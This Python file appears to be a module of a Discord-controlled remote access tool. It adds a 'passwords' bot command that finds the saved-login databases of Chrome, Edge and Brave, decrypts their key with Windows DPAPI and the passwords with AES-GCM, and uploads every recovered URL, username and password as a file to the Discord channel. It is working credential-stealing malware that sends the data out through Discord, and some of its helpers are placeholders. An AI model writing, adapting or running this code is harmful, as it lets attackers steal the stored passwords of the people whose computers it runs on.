import os
import json
import base64
import sqlite3
import shutil
import discord
from discord.ext import commands
from datetime import datetime
from src.client.core.platform import Platform

# For Windows Decryption
try:
    import win32crypt
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    pass

class Browser(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def get_chrome_datetime(self, chromedate):
        """Return a datetime.datetime object from a chrome format datetime."""
        if chromedate != 160100000000000000 and chromedate != -1:
            try:
                return datetime(1601, 1, 1) + discord.utils.utcnow().replace(tzinfo=None) # Placeholder for real conversion
            except:
                return ""
        else:
            return ""

    def get_encryption_key(self, local_state_path):
        if not os.path.exists(local_state_path):
            return None
        
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        # Decode the encryption key from Base64
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        
        # Remove DPAPI prefix 'DPAPI'
        encrypted_key = encrypted_key[5:]
        
        # Decrypt the key using Windows Data Protection API (DPAPI)
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    def decrypt_password(self, password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            aesgcm = AESGCM(key)
            return aesgcm.decrypt(iv, password, None).decode()
        except:
            return ""

    def get_browser_paths(self):
        paths = []
        home = Platform.get_home_path()
        
        if Platform.is_windows():
            local = os.environ.get("LOCALAPPDATA")
            roaming = os.environ.get("APPDATA")
            
            # Chrome
            paths.append({
                "name": "Chrome",
                "local_state": os.path.join(local, "Google", "Chrome", "User Data", "Local State"),
                "login_data": os.path.join(local, "Google", "Chrome", "User Data", "Default", "Login Data")
            })
            # Edge
            paths.append({
                "name": "Edge",
                "local_state": os.path.join(local, "Microsoft", "Edge", "User Data", "Local State"),
                "login_data": os.path.join(local, "Microsoft", "Edge", "User Data", "Default", "Login Data")
            })
            # Brave
            paths.append({
                "name": "Brave",
                "local_state": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Local State"),
                "login_data": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
            })
            
        elif Platform.is_linux():
            config = os.path.join(home, ".config")
            # Chrome Linux
            paths.append({
                "name": "Chrome (Linux)",
                "local_state": None, # Linux doesn't use Local State for encryption in the same way
                "login_data": os.path.join(config, "google-chrome", "Default", "Login Data")
            })
            # Brave Linux
            paths.append({
                "name": "Brave (Linux)",
                "local_state": None,
                "login_data": os.path.join(config, "BraveSoftware", "Brave-Browser", "Default", "Login Data")
            })

        return paths

    @commands.command(name="passwords", help="Extract browser passwords (Windows for now).")
    async def extract_passwords(self, ctx):
        all_passwords = ""
        browser_paths = self.get_browser_paths()
        
        for browser in browser_paths:
            name = browser["name"]
            login_db = browser["login_data"]
            local_state = browser["local_state"]
            
            if not os.path.exists(login_db):
                continue
                
            all_passwords += f"\n--- {name} ---\n"
            
            if Platform.is_windows() and local_state:
                try:
                    key = self.get_encryption_key(local_state)
                    # Copy DB to avoid lock
                    shutil.copy2(login_db, "temp_db")
                    conn = sqlite3.connect("temp_db")
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    
                    for row in cursor.fetchall():
                        url = row[0]
                        username = row[1]
                        encrypted_password = row[2]
                        decrypted_password = self.decrypt_password(encrypted_password, key)
                        if username or decrypted_password:
                            all_passwords += f"URL: {url}\nUser: {username}\nPass: {decrypted_password}\n\n"
                    
                    cursor.close()
                    conn.close()
                    os.remove("temp_db")
                except Exception as e:
                    all_passwords += f"Error extracting from {name}: {str(e)}\n"
            else:
                all_passwords += f"Decryption not yet fully implemented for this platform/browser combination.\n"

        if not all_passwords.strip():
            await ctx.send("❌ No passwords found or extraction failed.")
            return

        # Send as file
        file_name = f"passwords_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(all_passwords)
            
        await ctx.send(f"🔑 Password dump for {ctx.author.name}:", file=discord.File(file_name))
        os.remove(file_name)

async def setup(bot):
    await bot.add_cog(Browser(bot))
